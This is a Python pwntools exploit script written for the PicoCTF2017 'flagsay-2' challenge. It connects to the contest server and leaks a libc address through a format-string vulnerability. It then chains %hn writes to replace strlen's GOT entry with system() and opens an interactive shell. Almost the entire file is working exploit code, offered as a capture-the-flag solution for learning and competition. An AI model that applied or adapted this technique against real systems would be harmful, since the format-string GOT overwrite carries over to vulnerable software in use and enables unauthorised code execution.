## exploit_flagsay_2.py, by Sudoite
## For PicoCTF2017

from pwn import *
from time import sleep


#p = process('./new_server_executable/flagsay-2',
#	        env={"LD_PRELOAD": './flagsay-2/new_server_executable/libc.so.6'})
p = process('nc shell2017.picoctf.com 35563', shell=True)
# Alternative syntax: p = remote('shell2017.picoctf.com', 35563)


### Leak a libc address
print(p.send("%2$p%17$p\n"))
print(p.recvuntil('0x'))
IO_addr = p.recv(8)
print("IO_2_1_stdin__addr = " + str(IO_addr))
IO_addr = int(IO_addr,16)

# libc_addr = IO_addr - 0x5a0 - 0x2000 - 0x1b0000  # Local
libc_addr = IO_addr - 0x1a9c20  # server
# system_addr = libc_addr + 0x3ada0 # Local
system_addr = libc_addr + 0x3e3e0  # server
print("system address: " + hex(system_addr))
###



### Set up the stack to write to the GOT
# We start with: parameter 17 --> parameter 53
#                parameter 35 --> data section
#                parameter 43 --> data section
# We want to:
# 1. Get address of parameter 53 from parameter 17
# 2. Calculate addresses of parameters 35 and 43 from the address of parameter 53
# 3. Figure out what bytes we need to write to the last two bytes of parameters 35 and 43
# 4. Overwrite parameter 53 with address of parameter 35
# 5. Overwrite parameter 35 with address of the first half of strlen in the GOT
# 6. Overwrite parameter 53 with address of parameter 43
# 7. Overwrite parameter 43 with address of the second half of strlen in the GOT
###


# 1. Address of parameter 53 is %17$p from previous string
stack_addr_53 = p.recv(10)[2:]
print("Stack address (parameter 53) = " + str(stack_addr_53))
stack_addr_53 = int(stack_addr_53, 16)  # address of parameter 53


# 2. Calculate addresses of parameters 35 and 43 from that of parameter 53,
# in order to figure out what we'll need to write to the last two bytes of
# the address of parameter 53
stack_addr_35 = stack_addr_53 - 18*0x04
print("Address of \"parameter 35\" on stack = " + hex(stack_addr_35))

#print("last two bytes of address of parameter #35: " + hex(stack_addr_35)[6:])
spacing_needed_1 = int(hex(stack_addr_35)[6:], 16) - 0x81
# I'm not sure why I need to subtract 0x81 -- I just determined during
# debugging that it was necessary. Caesarus also reports having taken the same approach.

stack_addr_43 = stack_addr_53 - 10*0x04
print("Address of \"parameter 43\" on stack = " + hex(stack_addr_43))
#print("last two bytes of address of parameter #43: " + hex(stack_addr_43)[6:])
spacing_needed_3 = int(hex(stack_addr_43)[6:], 16) - 0x81


# 3. Figure out what bytes we need to write to the last two bytes of parameters 35 and 43
# 0x08049984 is the GOT address of the pointer to strlen in original flagsay-2 executable

#print("Desired last two bytes of parameter #35: 0x9984")
spacing_needed_2 = 0x9984 - 0x81

#print("Desired last two bytes of parameter #43: 0x9986")
spacing_needed_4 = 0x9986 - 0x81

# Lots of garbage in the output, still helpful to view it for debugging purposes.
# But it needs to be cleared
print(p.recv(timeout=2))


# 4. Overwrite parameter 53 with address of parameter 35
print(p.send("%"+str(spacing_needed_1)+"x%17$hn\n"))
print(p.recv(timeout=1))


# 5. Overwrite parameter 35 with address of the first half of strlen in the GOT
print(p.send("%"+str(spacing_needed_2)+"x%53$hn\n"))
print(p.recv(timeout=1))


# 6. Overwrite parameter 53 with address of paramater 43
print(p.send("%"+str(spacing_needed_3)+"x%17$hn\n"))
print(p.recv(timeout=1))


# 7. Overwrite parameter 43 with address of the second half of strlen in the GOT
print(p.send("%"+str(spacing_needed_4)+"x%53$hn\n"))
print(p.recv(timeout=1))



### Write to the GOT

# 8. Using two writes with one command, use parameters 45 and 53 to overwrite
#    the address of strlen in the GOT

system_addr_back_half = int(hex(system_addr)[6:],16)
system_addr_front_half = int(hex(system_addr)[2:6],16)
print("Desired first two bytes of GOT entry: " + hex(system_addr_front_half))
print("Desired last two bytes of GOT entry: " + hex(system_addr_back_half))
spacing_needed_5 = system_addr_back_half - 0x81
spacing_needed_6 = system_addr_front_half + 0x10000 - spacing_needed_5 - 0x81
print("spacing_needed_5: " + str(spacing_needed_5))
print("spacing_needed_6: " + str(spacing_needed_6))

print(p.recvrepeat(timeout=1))

print(p.send("%" + str(spacing_needed_5) + "x%35$hn%" + str(spacing_needed_6) + "x%43$hn\n"))

print(p.recvrepeat(timeout=1))

print("Going to interactive")
p.interactive()
